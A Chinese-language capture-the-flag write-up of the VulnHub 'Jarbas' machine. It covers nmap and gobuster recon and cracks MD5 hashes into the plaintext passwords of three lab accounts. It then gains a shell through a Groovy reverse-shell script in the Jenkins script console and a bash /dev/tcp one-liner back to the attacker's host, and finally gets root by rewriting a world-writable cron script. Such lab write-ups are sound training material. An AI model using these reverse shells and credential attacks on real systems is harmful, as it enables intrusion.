---
title: vulnhub靶机--Jarbas
categories: 靶机系列
---

## 一.主机发现和信息收集：

```Shell
╭─ /home/kali/Desktop/RedTeamNote/Jarbas ··········· х INT with root@kali at 21:53:16 ─╮
╰─❯ nmap -sn 192.168.0.0/24                                                           ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 21:53 EDT
Nmap scan report for 192.168.0.1
Host is up (0.0054s latency).
MAC Address: 48:7D:2E:DE:45:22 (TP-Link Technologies)
Nmap scan report for 192.168.0.103
Host is up (0.000049s latency).
MAC Address: 70:08:94:2E:B7:41 (Unknown)
Nmap scan report for 192.168.0.106
Host is up (0.25s latency).
MAC Address: F4:28:9D:61:4E:6D (Unknown)
Nmap scan report for 192.168.0.107
Host is up (0.26s latency).
MAC Address: 84:08:3A:11:B2:E1 (Unknown)
Nmap scan report for 192.168.0.109
Host is up (0.26s latency).
MAC Address: F4:28:9D:61:4E:6D (Unknown)
Nmap scan report for 192.168.0.110
Host is up (0.26s latency).
MAC Address: 76:98:67:CA:0D:82 (Unknown)
Nmap scan report for 192.168.0.111
Host is up (0.26s latency).
MAC Address: EC:5C:68:E8:9B:D5 (Chongqing Fugui Electronics)
Nmap scan report for 192.168.0.112
Host is up (0.00034s latency).
MAC Address: 08:00:27:EB:9E:FC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.0.113
Host is up.
Nmap done: 256 IP addresses (9 hosts up) scanned in 4.32 seconds

╭─ /home/kali/Desktop/RedTeamNote/Jarbas ········· took 4s with root@kali at 21:53:27 ─╮
╰─❯ nmap -sT -p- 192.168.0.112 --min-rate 10000                                       ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 21:54 EDT
Nmap scan report for 192.168.0.112
Host is up (0.00035s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 08:00:27:EB:9E:FC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.83 seconds

```

由于靶机采用VBox 搭建 我们查看sn的扫描结果 可以迅速定位目标主机的ip是192.168.0.112

接着扫描端口 发现112分别开放了 22,80,3306,8080 等机器 下面队这些端口进行深度扫描:

```Shell
╭─ /home/kali/Desktop/RedTeamNote/Jarbas ················· with root@kali at 21:54:12 ─╮
╰─❯ nmap -sT -sV  192.168.0.112 -p22,80,3306,8080 -O --min-rate 10000                 ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 21:59 EDT
Nmap scan report for 192.168.0.112
Host is up (0.0041s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
MAC Address: 08:00:27:EB:9E:FC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds

```

```Shell
╭─ /home/kali/Desktop/RedTeamNote/Jarbas ················· with root@kali at 22:01:10 ─╮
╰─❯ nmap -sT -sC 192.168.0.112 -p22,80,3306,8080 --min-rate 10000                     ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 22:01 EDT
Nmap scan report for 192.168.0.112
Host is up (0.0014s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
80/tcp   open  http
|_http-title: Jarbas - O Seu Mordomo Virtual!
| http-methods: 
|_  Potentially risky methods: TRACE
3306/tcp open  mysql
8080/tcp open  http-proxy
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 08:00:27:EB:9E:FC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds

```

```Shell
╭─ /home/kali/Desktop/RedTeamNote/Jarbas ········· took 4s with root@kali at 22:01:34 ─╮
╰─❯ nmap -sT -sC 192.168.0.112 -p22,80,3306,8080 --script=vuln                        ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 22:02 EDT
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.74% done; ETC: 22:03 (0:00:00 remaining)
Nmap scan report for 192.168.0.112
Host is up (0.0027s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.0.112:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/njarb_data/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/njarb_data/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/njarb_data/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/njarb_data/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=S%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.0.112:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
|_    http://192.168.0.112:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.0.112
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.0.112:80/
|     Form id: wmtb
|     Form action: /web/submit
|     
|     Path: http://192.168.0.112:80/
|     Form id: 
|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php
|     
|     Path: http://192.168.0.112:80/
|     Form id: 
|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/
|_http-trace: TRACE is enabled
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
3306/tcp open  mysql
8080/tcp open  http-proxy
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 08:00:27:EB:9E:FC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 83.79 seconds

```

该页面可能存在sql注入

攻击排序：

80→8080→3306→22

### 二.Web渗透测试：

{% asset_img image.png %}

打开发现是一个web页面 

打开8080端口：

{% asset_img image_1.png %}

推测可能是80端口的管理端

```Shell
╭─ /home/kali/Desktop/RedTeamNote/Jarbas ····· took 1m 24s with root@kali at 22:03:36 ─╮
╰─❯ whatweb http://192.168.0.112/ -v                                                  ─╯
WhatWeb report for http://192.168.0.112/
Status    : 200 OK
Title     : Jarbas - O Seu Mordomo Virtual!
IP        : 192.168.0.112
Country   : RESERVED, ZZ

Summary   : Apache[2.4.6], Frame, Google-Analytics[Universal], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], Mark-of-the-Web[http://dynamicdrive.com/dynamicindex3/snow.htm], PasswordField[password], PHP[5.4.16], Script[JavaScript,javascript,text/javascript]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.6 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Frame ]
        This plugin detects instances of frame and iframe HTML 
        elements. 


[ Google-Analytics ]
        This plugin identifies the Google Analytics account. 

        Version      : Universal
        Website     : http://www.google.com/analytics/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : CentOS
        String       : Apache/2.4.6 (CentOS) PHP/5.4.16 (from server string)

[ Mark-of-the-Web ]
        The MOTW is a comment added to the HTML markup for a Web 
        page. When a user opens the Web page from their local 
        machine, Internet Explorer references this comment to 
        determine the security zone in which it should run the 
        page. 

        String       : http://dynamicdrive.com/dynamicindex3/snow.htm
        Website     : http://msdn.microsoft.com/en-us/library/ms537628%28v=vs.85%29.aspx

[ PHP ]
        PHP is a widely-used general-purpose scripting language 
        that is especially suited for Web development and can be 
        embedded into HTML. This plugin identifies PHP errors, 
        modules and versions and extracts the local file path and 
        username if present. 

        Version      : 5.4.16
        Google Dorks: (3)
        Website     : http://www.php.net/

[ PasswordField ]
        find password fields 

        String       : password (from field name)

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 

        String       : JavaScript,javascript,text/javascript

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 05 Jun 2026 02:10:58 GMT
        Server: Apache/2.4.6 (CentOS) PHP/5.4.16
        Last-Modified: Sun, 01 Apr 2018 13:55:39 GMT
        ETag: "8028-568c9d40eacc0"
        Accept-Ranges: bytes
        Content-Length: 32808
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

从这个结果我们可以得知一些版本信息 接下来进行目录爆破：

```Shell
╭─ /home/kali/Desktop/RedTeamNote/Jarbas ················· with root@kali at 22:37:51 ─╮
╰─❯ gobuster dir -u "http://192.168.0.112/" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt  -x html,php -t 64                 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.112/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 32808]
/access.html          (Status: 200) [Size: 359]
/index.html           (Status: 200) [Size: 32808]
Progress: 186843 / 186843 (100.00%)
===============================================================
Finished
===============================================================

╭─ /home/kali/Desktop/RedTeamNote/Jarbas ···· took 29m 58s with root@kali at 23:08:05 ─╮
╰─❯                                         
```

访问access.html

{% asset_img image_2.png %}

发现有疑似账户的信息：

进行hash识别：

```Shell
╭─ /home/kali/Desktop/RedTeamNote/Jarbas ···· took 29m 58s with root@kali at 23:08:05 ─╮
╰─❯ hash-identifier 5978a63b4654c73c60fa24f836386d87                                  ─╯
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
```

发现是md5 在线进行md5解码操作：

  tiago:italia99

  trindade:marianna

  eder:vipsu

使用这些账户登录ssh无果后 尝试撞库8080的登录界面 最终得到的结果是
eder:vipsu

{% asset_img image_3.png %}

在脚本命令执行中 尝试反弹shell

```Groovy
String host="192.168.0.113";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

注: Jenkins的script使用Groovy 语言编写

或者：新建任务→构建一个自由风格的软件项目

{% asset_img image_4.png %}

→构建→执行shell

{% asset_img image_5.png %}

输入反向shell的命令

bash -i >& /dev/tcp/192.168.0.113/4444 0>&1

```Groovy
╭─ /home/kali/Desktop ···································· with root@kali at 04:17:30 ─
╰─❯ nc -lvp 4444                                                                      ─
listening on [any] 4444 ...
192.168.0.112: inverse host lookup failed: Unknown host
connect to [192.168.0.113] from (UNKNOWN) [192.168.0.112] 49530
bash: no job control in this shell
bash-4.2$ ls
ls
bash-4.2$ clear
clear
TERM environment variable not set.
bash-4.2$ id
id
uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_s0
bash-4.2$ uname -a
uname -a
Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_6x86_64 GNU/Linux
bash-4.2$ 
```

### 三.权限提升:

使用sudo -l 查看当前有哪些权限

```Groovy
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified
bash-4.2$ 

```

find 查找suid 的权限：

```Shell
bash-4.2$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib64/dbus-1/dbus-daemon-launch-helper
bash-4.2$ 

```

我们重点关注/usr/bin/crontab

也就是说我们可以利用/usr/bin/crontab 进行提权 ，查看cat /etc/crontab

```Shell
bash-4.2$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
bash-4.2$     

```

/etc/script/CleaningScript.sh 以root权限运行！且每五分钟执行一次

ls -la 查看一下：

```Shell
bash-4.2$ ls -la /etc/script/CleaningScript.sh
-rwxrwxrwx. 1 root root 64 May 28 01:47 /etc/script/CleaningScript.sh
bash-4.2$ 
```

发现权限是**777 所有用户可读可写可执行！**

我们修改该文件 为反向shell脚本 本地监听 ，即可获得root权限

```Shell
┌──(kali㉿kali)-[~]
└─$ nc -lvp 8888              
listening on [any] 8888 ...
ls
192.168.0.112: inverse host lookup failed: Unknown host
connect to [192.168.0.113] from (UNKNOWN) [192.168.0.112] 57244
bash: no job control in this shell
[root@jarbas ~]# ls
flag.txt
[root@jarbas ~]# ls
ls
flag.txt
[root@jarbas ~]# cat flag.txt   
cat flag.txt
Hey!

Congratulations! You got it! I always knew you could do it!
This challenge was very easy, huh? =)

Thanks for appreciating this machine.

@tiagotvrs 
[root@jarbas ~]# 
```

成功执行！

